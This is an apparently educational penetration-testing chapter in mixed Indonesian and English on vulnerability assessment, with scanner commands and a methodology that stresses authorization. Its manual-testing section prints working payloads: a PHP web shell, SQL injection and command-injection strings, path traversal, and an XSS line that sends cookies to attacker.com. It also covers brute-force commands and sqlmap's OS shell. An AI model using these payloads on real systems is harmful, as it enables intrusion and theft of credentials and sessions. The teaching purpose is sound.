# 2.1 Vulnerability Assessment

Vulnerability assessment adalah proses sistematis mengidentifikasi, mengukur, dan memprioritaskan vulnerabilities (kerentanan) dalam sistem. Ini adalah langkah krusial sebelum melakukan exploitation untuk memahami attack surface.

## Mengapa Vulnerability Assessment Penting?

1. **Risk Management** - Memahami resiko keamanan yang ada
2. **Prioritization** - Menentukan mana vulnerabilities yang harus ditangani dulu
3. **Compliance** - Memenuhi requirement compliance
4. **Remediation Planning** - Membuat plan untuk mengatasi vulnerabilities
5. **Attack Path Mapping** - Memetakan jalur attack yang mungkin

## Metodologi Vulnerability Assessment

### 1. Planning & Preparation
- Define scope of assessment
- Identify assets dan criticality
- Select appropriate tools
- Prepare testing environment

### 2. Scanning & Discovery
- Port scanning
- Service fingerprinting
- Version detection
- Configuration review

### 3. Vulnerability Identification
- Automated scanning
- Manual testing
- Configuration analysis
- Code review

### 4. Verification
- Manual verification of findings
- False positive elimination
- Exploitability assessment

### 5. Reporting
- Document findings
- Prioritize by risk
- Provide remediation recommendations

## Automated Vulnerability Scanning

### Nmap Vulnerability Scanning

```bash
# Run all vulnerability scripts
nmap --script vuln target.com

# Specific vulnerability categories
nmap --script "vuln and not intrusive" target.com
nmap --script "vuln and safe" target.com

# Check SMB vulnerabilities
nmap --script smb-vuln-ms17-010 target.com
nmap --script smb-vuln-ms08-067 target.com

# Check for default credentials
nmap --script auth-brute target.com

# Check web vulnerabilities
nmap --script http-sql-injection target.com
nmap --script http-xssed target.com
nmap --script http-csrf target.com

# Check FTP vulnerabilities
nmap --script ftp-anon,ftp-bounce target.com

# Check SSH vulnerabilities
nmap --script ssh-hostkey,ssh-auth-methods target.com
```

### Advanced Nmap Scanning

```bash
# Version detection dengan intensity level
nmap -sV --version-intensity 9 target.com
nmap -sV --version-all target.com

# Service info scanning
nmap -sV --version-intensity 7 -A target.com

# Custom script scanning
nmap --script "default,safe,vuln" target.com
nmap --script "external,discovery" target.com

# Scanning dengan custom arguments
nmap --script "auth-brute" --script-args userdb=users.txt,passdb=pass.txt target.com
```

### Nessus/Nessus Essentials

```bash
# Nessus command line interface (Nessus CLI)
/opt/nessus/sbin/nessuscli scan start --policy-id=1 --targets=target.com

# Export scan results
/opt/nessus/sbin/nessuscli scan export --format=csv --file=results.csv scan-id

# List semua scans
/opt/nessus/sbin/nessuscli scan list
```

### OpenVAS

```bash
# Create target
gvm-cli socket --xml "<create_target><name>Target</name><hosts>192.168.1.0/24</hosts></create_target>"

# Create task
gvm-cli socket --xml "<create_task><name>Scan</name><config id='daba56c8-73ec-11df-a475-002264764cea'/><target id='target-id'/></create_task>"

# Start scan
gvm-cli socket --xml "<start_task task_id='task-id'/>"

# Get results
gvm-cli socket --xml "<get_results task_id='task-id'/>"
```

## Service-Specific Vulnerability Assessment

### Web Application Vulnerability Scanning

**Nikto:**
```bash
# Basic scan
nikto -h http://target.com

# Scan dengan specific ports
nikto -h target.com -p 80,443,8080

# Scan dengan output
nikto -h http://target.com -o nikto_output.html -Format htm

# Scan dengan custom user agent
nikto -h http://target.com -useragent "Googlebot/2.1"

# Scan dari proxy
nikto -h http://target.com -useproxy http://proxy:8080
```

**OWASP ZAP (GUI):**
```bash
# Command line quick scan
zap.sh -quickurl http://target.com

# Automated scan
zap.sh -cmd -quickurl http://target.com -quickprogress

# Spider and active scan
zap.sh -cmd -quickurl http://target.com -quickattackurl
```

**Skipfish:**
```bash
# Basic scan
skipfish -o output_folder http://target.com

# Scan dengan wordlist
skipfish -o output -W /usr/share/skipfish/dictionaries/medium.wl http://target.com

# Scan dengan specific options
skipfish -o output -X .jpg -Y .gif -I 200,204,301,302 http://target.com
```

**SQLMap:**
```bash
# Test SQL injection di URL
sqlmap -u "http://target.com/page?id=1" --dbs

# Test POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs

# Test dengan cookie
sqlmap -u "http://target.com" --cookie="session=value" --dbs

# Test dengan burp request file
sqlmap -r request.txt --dbs

# Test batch injection
sqlmap -u "http://target.com/page.php?param=1*" --batch

# Test untuk specific database
sqlmap -u "http://target.com/page?id=1" --dbms=mysql --dbs

# Test untuk OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

### SMB Vulnerability Assessment

**SMB Enumeration:**
```bash
# Check SMB version
nmap -p445 --script smb-protocols target.com

# Check SMB signing
nmap -p445 --script smb2-security-mode target.com

# Check for anonymous sessions
nmap -p445 --script smb-enum-shares.nse,smb-enum-users.nse target.com

# Check SMB shares
smbmap -H target.com
smbmap -H target.com -R  # Recursive listing
smbmap -H target.com -u user -p pass

# Check for null sessions
rpcclient -U "" -N target.com
```

**SMB Vulnerability Scanning:**
```bash
# EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 target.com

# MS08-067
nmap --script smb-vuln-ms08-067 target.com

# SMB2 vulnerabilities
nmap -p445 --script smb-vuln-ms10-054,ms10-061 target.com

# SMB client vulnerabilities
nmap -p139,445 --script smb-vuln-regsvc-dos target.com
```

### SSH Vulnerability Assessment

```bash
# SSH version detection
nmap -p22 --script ssh2-enum-algos target.com
nmap -p22 --script ssh-hostkey target.com

# Check weak algorithms
nmap -p22 --script ssh-auth-methods target.com

# SSH brute force
medusa -H targets.txt -U users.txt -P passwords.txt -M ssh
hydra -l admin -P passwords.txt ssh://target.com

# Check for SSH keys
find / -name "id_rsa*" -type f 2>/dev/null
cat ~/.ssh/known_hosts
```

### Database Vulnerability Assessment

**MySQL Assessment:**
```bash
# MySQL version and configuration
nmap -p3306 --script mysql-info,mysql-variables,mysql-databases target.com
nmap -p3306 --script mysql-users,mysql-empty-password target.com

# MySQL vulnerabilities
nmap -p3306 --script mysql-vuln-cve2012-2122 target.com

# Manual testing
mysql -h target.com -u root -p
SHOW VARIABLES LIKE 'version';
SHOW DATABASES;
SELECT * FROM mysql.user;
```

**MSSQL Assessment:**
```bash
# MSSQL information gathering
nmap -p1433 --script ms-sql-info,ms-sql-config target.com
nmap -p1433 --script ms-sql-empty-password,ms-sql-brute target.com

# MSSQL vulnerabilities
nmap -p1433 --script ms-sql-dump-hashes target.com
nmap -p1433 --script ms-sql-xp-cmdshell target.com
```

**PostgreSQL Assessment:**
```bash
# PostgreSQL enumeration
nmap -p5432 --script pgsql-brute target.com
nmap -p5432 --script pgsql-databases target.com

# Manual testing
psql -h target.com -U postgres -l
```

### SNMP Vulnerability Assessment

```bash
# SNMP enumeration
nmap -sU -p161 --script snmp-brute target.com
nmap -sU -p161 --script snmp-sysdescr target.com
nmap -sU -p161 --script snmp-processes target.com

# SNMP information gathering
snmpwalk -c public -v1 target.com
snmpwalk -c private -v2c target.com
snmpwalk -v3 -l authPriv -u admin -a MD5 -A pass -x DES -X privpass target.com

# Common SNMP community strings
onesixtyone target.com
snmp-check target.com
```

### FTP Vulnerability Assessment

```bash
# FTP enumeration
nmap -p21 --script ftp-anon,ftp-bounce target.com
nmap -p21 --script ftp-libopie,ftp-proftpd-backdoor target.com

# Anonymous FTP access
ftp target.com
# Username: anonymous
# Password: anonymous@email.com

# FTP version and banner
nc -nv target.com 21
telnet target.com 21
```

## Manual Vulnerability Assessment

### File Upload Vulnerability Testing

```bash
# Test dengan berbagai file types
# PHP web shell
<?php system($_GET['cmd']); ?>

# PHP dengan different extension
shell.php5
shell.phtml
test.php.jpg

# Check upload restrictions
# Bypass dengan:
- Content-Type manipulation: image/jpeg
- Double extension: shell.php.jpg
- Null byte: shell.php%00.jpg
- Magic bytes: GIF89a<?php system($_GET['cmd']); ?>

# Test upload directory permissions
# Check jika upload directory accessible
# Check jika uploaded files executable
```

### SQL Injection Testing

```bash
# Test parameters untuk injection
# URL parameters
?id=1' OR '1'='1
?id=1" OR "1"="1

# POST parameters
username=admin'--
username=admin' OR '1'='1'--

# Error-based injection
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --

# Time-based injection
' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --

# Union-based injection
' UNION SELECT 1,2,3 --
' UNION SELECT database(),version(),3 --

# Blind SQL injection
' AND 1=1
' AND 1=2
```

### Cross-Site Scripting (XSS) Testing

```bash
# Reflected XSS payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">

# Stored XSS testing
<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>

# XSS filter bypasses
<ScRiPt>alert('XSS')</ScRiPt>
%3Cscript%3Ealert('XSS')%3C/script%3E
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
```

### Command Injection Testing

```bash
# Basic command injection
; whoami
&& id
| cat /etc/passwd
`whoami`
$(id)

# Blind command injection
; sleep 10
&& ping -c 10 127.0.0.1

# Time-based detection
; if [ $(whoami) = 'root' ]; then sleep 5; fi

# Command chaining
command1; command2
command1 && command2
command1 | command2
```

### Directory Traversal Testing

```bash
# Basic path traversal
../../../etc/passwd
../../../../../../windows/win.ini

# URL encoded variations
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%c0%af..%c0%af..%c0%afetc/passwd

# Windows traversal
..\..\..\windows\system32\drivers\etc\hosts
../../../../boot.ini

# Null byte injection
../../../etc/passwd%00
```

### Authentication Bypass Testing

```bash
# SQL injection di login form
admin' --
admin' OR '1'='1
' OR '1'='1' --
' OR '1'='1'/*

# Weak password testing
admin:admin
admin:password
admin:123456
root:root

# Session testing
# Check untuk predictable session IDs
# Test session fixation
# Check session timeout
```

## Vulnerability Scoring & Prioritization

### CVSS Scoring

```bash
# Calculate CVSS score
# Base Metrics:
- Attack Vector (AV)
- Attack Complexity (AC)
- Privileges Required (PR)
- User Interaction (UI)
- Scope (S)
- Confidentiality (C)
- Integrity (I)
- Availability (A)

# Temporal Metrics:
- Exploit Code Maturity (E)
- Remediation Level (RL)
- Report Confidence (RC)

# Environmental Metrics:
- Confidentiality Requirement (CR)
- Integrity Requirement (IR)
- Availability Requirement (AR)
```

### Risk Assessment Matrix

```
Severity Levels:
- Critical: 9.0-10.0 (Immediate action required)
- High: 7.0-8.9 (Action required within 30 days)
- Medium: 4.0-6.9 (Action required within 90 days)
- Low: 0.1-3.9 (Action when time permits)
- Informational: 0.0 (No action needed)
```

## Vulnerability Assessment Reports

### Report Structure

1. **Executive Summary**
   - Key findings
   - Risk overview
   - Recommendations

2. **Technical Details**
   - Vulnerability description
   - Affected systems
   - Proof of concept
   - CVSS score

3. **Remediation**
   - Fix recommendations
   - Workarounds
   - Timeframes

4. **Appendices**
   - Full scan results
   - Tool configurations
   - References

## Automation Tools

### Custom Assessment Scripts

```bash
#!/bin/bash
# vuln_scanner.sh - Simple vulnerability scanner

TARGET=$1
OUTPUT_DIR="scan_results_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR

# Port scan
echo "Running port scan..."
nmap -sS -sV -oA $OUTPUT_DIR/port_scan $TARGET

# Web scan
echo "Running web vulnerability scan..."
nikto -h http://$TARGET -o $OUTPUT_DIR/nikto.html -Format htm

# SMB scan
echo "Running SMB vulnerability scan..."
nmap -p445 --script smb-vuln-ms17-010,smb-vuln-ms08-067 -oA $OUTPUT_DIR/smb_vuln $TARGET

# Generate summary
echo "Generating summary..."
echo "Vulnerability Assessment Summary for $TARGET" > $OUTPUT_DIR/summary.txt
echo "Date: $(date)" >> $OUTPUT_DIR/summary.txt
echo "==========================================" >> $OUTPUT_DIR/summary.txt

# Extract high-risk findings
echo -e "\nHigh Risk Findings:" >> $OUTPUT_DIR/summary.txt
grep -i "vuln" $OUTPUT_DIR/port_scan.nmap >> $OUTPUT_DIR/summary.txt
grep -i "OSVDB" $OUTPUT_DIR/nikito.html >> $OUTPUT_DIR/summary.txt

echo "Scan complete. Results saved in $OUTPUT_DIR"
```

## Best Practices

### Before Scanning
1. **Get Authorization** - Pastikan ada written permission
2. **Define Scope** - Tentukan range IP dan systems yang akan di-scan
3. **Schedule Window** - Pilih waktu yang tidak mengganggu production
4. **Notify Stakeholders** - Inform team yang terkait

### During Scanning
1. **Rate Limiting** - Jangan overload target systems
2. **Log Everything** - Document semua scan activities
3. **Monitor Impact** - Watch untuk adverse effects
4. **Verify Results** - Manual verification untuk critical findings

### After Scanning
1. **Validate Findings** - Confirm exploitability
2. **Prioritize** - Rank vulnerabilities by risk
3. **Report Promptly** - Share findings dengan stakeholders
4. **Track Remediation** - Monitor progress fixes

## Common Pitfalls

1. **False Positives** - Automated scanners sering menghasilkan false positives
2. **Missing Context** - Scanners tidak memahami business context
3. **Incomplete Coverage** - Automated tools miss complex vulnerabilities
4. **Scanning Noise** - Banyak network noise yang bisa trigger alerts
5. **Credential Requirements** - Some vulnerabilities need authenticated access

## Important Notes

1. **Combine Methods** - Gunakan automated dan manual testing
2. **Update Tools** - Pastikan signature database up-to-date
3. **Know Your Tools** - Pahami limitations setiap tool
4. **Stay Legal** - Hanya scan authorized systems
5. **Document Everything** - Maintain comprehensive audit trail

Vulnerability assessment adalah foundation untuk penetration testing. Hasil assessment akan membantu dalam memprioritaskan exploitation efforts dan develop effective remediation plans.